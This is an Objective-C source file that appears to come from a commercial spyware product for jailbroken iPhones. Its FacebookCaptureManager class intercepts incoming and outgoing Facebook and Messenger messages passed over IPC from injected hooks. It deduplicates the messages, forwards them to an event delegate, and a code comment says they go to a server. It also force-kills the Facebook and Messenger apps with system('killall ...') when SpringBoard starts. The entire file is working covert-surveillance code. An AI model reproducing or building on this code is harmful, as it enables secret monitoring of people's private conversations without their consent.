//
//  FacebookCaptureManager.m
//  FacebookCaptureManager
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "FacebookCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "SpringBoardServices.h"
#import "SBDidLaunchNotifier.h"
#import "FxIMEventUtils.h"
#import "DaemonPrivateHome.h"

#import <UIKit/UIKit.h>

@interface FacebookCaptureManager (private)
- (void) filterIncomingFacebookEvent: (FxIMEvent *) aEvent;
- (void) sendIMEvents: (NSArray *) aIMEvents;
- (void) sendIMEvent: (FxIMEvent *) aFxIMEvent;
- (BOOL) isMessengerAppInstalled;
- (BOOL) isMessengerAppRunning;
- (NSString *) getFrontMostApplication;
- (void) springboardDidLaunch;
- (void) saveMessageIdsToPlist:(NSArray *) aMessageIds;
- (NSArray *) readMessageIdsFromPlist;
@end

#define FACEBOOK_INDENTIFIER	@"com.facebook.Facebook"
#define MESSENGER_INDENTIFIER	@"com.facebook.Messenger"

@implementation FacebookCaptureManager

@synthesize mEventDelegate;
@synthesize mFacebookMessageIDHistory;

- (id) init {
	if ((self = [super init])) {
		mSBNotifier = [[SBDidLaunchNotifier alloc] init];
		[mSBNotifier setMDelegate:self];
		[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
		
        mFacebookEvents = [[NSMutableArray alloc] init];
        
		NSArray *messageIds = [self readMessageIdsFromPlist];
        mFacebookMessageIDHistory = [[NSMutableArray alloc] initWithArray:messageIds];
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Facebook messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kFacebookMessagePort 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
		[mSBNotifier start];
	}
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kFacebookMessagePort
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Facebook messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
		
		[mSBNotifier stop];
	}
	
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
		
		[mSBNotifier stop];
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *fbInfo = [unarchiver decodeObjectForKey:kFacebookArchied];
	NSString *bundleIdentifier = [fbInfo objectForKey:@"bundle"];
	FxIMEvent *imEvent = [fbInfo objectForKey:@"IMEvent"];
    [unarchiver finishDecoding];
	DLog(@"Facebook - imEvent = %@, bundle = %@", imEvent, bundleIdentifier);
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		if ([imEvent mDirection] == kEventDirectionIn) {
			[NSObject cancelPreviousPerformRequestsWithTarget:self];
			[self filterIncomingFacebookEvent:imEvent];
			[self performSelector:@selector(sendIMEvents:)
					   withObject:mFacebookEvents
					   afterDelay:5.0];
			
		} else if ([imEvent mDirection] == kEventDirectionOut) {
			NSString *frontMostApplicationIdentifier = [self getFrontMostApplication];
			if ([frontMostApplicationIdentifier isEqualToString:bundleIdentifier]) {
				[self sendIMEvent:imEvent];
			} else {
				// Delete the attachments if exist
				NSFileManager *fileManager = [NSFileManager defaultManager];
				for (FxAttachment *attachment in [imEvent mAttachments]) {
					[fileManager removeItemAtPath:[attachment fullPath] error:nil];
				}
			}
		}
		
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) filterIncomingFacebookEvent: (FxIMEvent *) aEvent {
	BOOL fbEventDuplicate = NO;
	
	for (FxIMEvent *fbEvent in mFacebookEvents) {
		
		DLog (@"---> existing: %@, new: %@", [fbEvent mMessageIdOfIM], [aEvent mMessageIdOfIM])
		// Incoming fb event from the same sender and have the same message Id thus treat only one message
		if ([[fbEvent mUserID] isEqualToString:[aEvent mUserID]]					&&
			[[fbEvent mMessageIdOfIM] isEqualToString:[aEvent mMessageIdOfIM]]) {
			DLog (@"!!!!!!!!!! Duplicate in recent !!!!!!!!!!!")
			fbEventDuplicate = YES;
			break;
		}
	}
		
	if (!fbEventDuplicate) {
		// check if message id is duplicated with the previous oneS or not
		for (NSString *fbMessageID in mFacebookMessageIDHistory) {
			
			DLog (@"---> (history) existing: %@, new: %@", fbMessageID, [aEvent mMessageIdOfIM])			
			if ([fbMessageID isEqualToString:[aEvent mMessageIdOfIM]]) {
				DLog (@"!!!!!!!!!! Duplicate in history !!!!!!!!!!!")
				fbEventDuplicate = YES;
				break;
			}
		}
	}				
	
	if (!fbEventDuplicate) {
		DLog (@"++++++++++++++ Not Duplicate +++++++++++++++++")
		[mFacebookEvents addObject:aEvent];
	} else {
		// Delete attachment if exist
		NSFileManager *fileManager = [NSFileManager defaultManager];
		for (FxAttachment *attachment in [aEvent mAttachments]) {
			[fileManager removeItemAtPath:[attachment fullPath] error:nil];
		}
	}
}

- (void) saveMessageIdsToPlist:(NSArray *)aMessageIds{
	NSString *path = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
    path = [path stringByAppendingPathComponent:@"FacebookMIDs.plist"];
    DLog(@"********* Saving Facebook message Ids path %@", path);
	
    if (aMessageIds) {
        NSDictionary *messageIdInfo = [NSDictionary dictionaryWithObject:aMessageIds forKey:@"messageIds"];
        [messageIdInfo writeToFile:path atomically:YES];
    }
}

- (NSArray *) readMessageIdsFromPlist {
    NSString *path = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
    path = [path stringByAppendingPathComponent:@"FacebookMIDs.plist"];
    DLog(@"********* Reading Facebook message Ids path %@", path);
    
    NSArray *messageIds = nil;
    NSDictionary *messageIdInfo = [NSDictionary dictionaryWithContentsOfFile:path];
    messageIds = [messageIdInfo objectForKey:@"messageIds"];
    if (!messageIds) {
        messageIds = [NSArray array];
    }
    return (messageIds);
}

- (void) sendIMEvents: (NSArray *) aIMEvents {
	DLog (@"************* !!!!!!! send im events !!!!!!! *******************")
	
	for (FxIMEvent *fbEvent in aIMEvents) {
		DLog (@"Sending im events %@", fbEvent)		
		[self sendIMEvent:fbEvent];
        
		//DLog (@"before: %@", mFacebookMessageIDHistory)
		// keep history of the message sent to the server up to 50 messages
		if ([mFacebookMessageIDHistory count] >= 50) {
			[mFacebookMessageIDHistory removeLastObject]; // remove object at index 50 (highest)
        }
		[mFacebookMessageIDHistory insertObject:[fbEvent mMessageIdOfIM] atIndex:0];
		//DLog (@"after: %@", mFacebookMessageIDHistory)
        
        [self saveMessageIdsToPlist:mFacebookMessageIDHistory];
	}
	[mFacebookEvents removeAllObjects];
}

- (void) sendIMEvent: (FxIMEvent *) aFxIMEvent {
    /*
    dispatch_queue_t queue_current = dispatch_get_current_queue();
    dispatch_queue_t queue_background = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_async(queue_background, ^(void){
        
        // Download attachment actual image/video, Messenger 35.0 up
        for (FxAttachment *attachment in [aFxIMEvent mAttachments]) {
            NSAutoreleasePool *attachmentPool = [[NSAutoreleasePool alloc] init];
            
            NSString *urlOfActual = [attachment fullPath];
            if (urlOfActual &&
                ([urlOfActual rangeOfString:@"http://"].location != NSNotFound ||
                [urlOfActual rangeOfString:@"https://"].location != NSNotFound)) {
                
                NSURL *url = [NSURL URLWithString:urlOfActual];
                NSData *actualData = [NSData dataWithContentsOfURL:url];
                
                NSString *urlOfThumbnail = [[[NSString alloc] initWithData:[attachment mThumbnail] encoding:NSUTF8StringEncoding] autorelease];
                NSURL *url2 = [NSURL URLWithString:urlOfThumbnail];
                NSData *thumbnailData = [NSData dataWithContentsOfURL:url2];
                
                if (actualData && thumbnailData) {
                    NSString *lastPath = [url lastPathComponent];
                    DLog(@"lastPathComponent, %@", lastPath);
                    NSString *fbAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
                    fbAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", fbAttachmentPath, [[NSDate date] timeIntervalSince1970], lastPath];
                    
                    [actualData writeToFile:fbAttachmentPath atomically:YES];
                    
                    [attachment setFullPath:fbAttachmentPath];
                    [attachment setMThumbnail:thumbnailData];
                } else {
                    NSString *pathExtension = [url pathExtension];
                    DLog(@"pathExtension, %@", pathExtension);
                    if ([pathExtension isEqualToString:@"jpg"] ||
                        [pathExtension isEqualToString:@"jpeg"] ||
                        [pathExtension isEqualToString:@"png"] ||
                        [pathExtension isEqualToString:@"gif"]) {
                        [attachment setFullPath:@"image/jpeg"];
                    } else {
                        [attachment setFullPath:@"video/mp4"];
                    }
                    [attachment setMThumbnail:nil];
                }
            }
            
            [attachmentPool drain];
        }
        
        dispatch_sync(queue_current, ^(void){
            NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:aFxIMEvent];
            for (FxEvent *imStructureEvent in imStructureEvents) {
                [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
            }
        });
    });
    */
    NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:aFxIMEvent];
    for (FxEvent *imStructureEvent in imStructureEvents) {
        [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
    }
}

- (BOOL) isMessengerAppInstalled {
	BOOL messengerInstalled = NO;
	NSDictionary *plistContent = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/User/Library/Caches/com.apple.mobile.installation.plist"];
	NSDictionary *userInstalledApp = [[NSDictionary alloc] initWithDictionary:[plistContent objectForKey:@"User"]];
	for (NSString* appKey in [userInstalledApp allKeys]) {	
		NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
		NSDictionary *appInfo = [userInstalledApp objectForKey:appKey];
		if ([[appInfo objectForKey:@"CFBundleIdentifier"] isEqualToString:MESSENGER_INDENTIFIER]) {
			messengerInstalled = YES;
			[pool release];
			pool = nil;
			break;
		}
		[pool release];
		pool = nil;
	}
	[plistContent release];
	[userInstalledApp release];
	return (messengerInstalled);
}

- (BOOL) isMessengerAppRunning {
	BOOL messengerRunning = NO;
	NSArray *activeApps = (NSArray *)SBSCopyApplicationDisplayIdentifiers(YES, NO);
	DLog (@"All active apps = %@", activeApps);
	for (NSString *bundleIdentifier in activeApps) {
		if ([bundleIdentifier isEqualToString:MESSENGER_INDENTIFIER]) {
			messengerRunning = YES;
			break;
		}
	}
	[activeApps release];
	return (messengerRunning);
}

- (NSString *) getFrontMostApplication {
	
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	return (frontmostApp);
}

- (void) springboardDidLaunch {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
	system("killall Facebook"); // Facebook
	system("killall Messenger"); // Messenger
#pragma GCC diagnostic pop
}

- (void) prerelease {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
}

- (void) dealloc {
	[self stopCapture];
	
	[mSBNotifier release];
	[mFacebookEvents release];
	[mFacebookMessageIDHistory release];
	[super dealloc];
}

@end
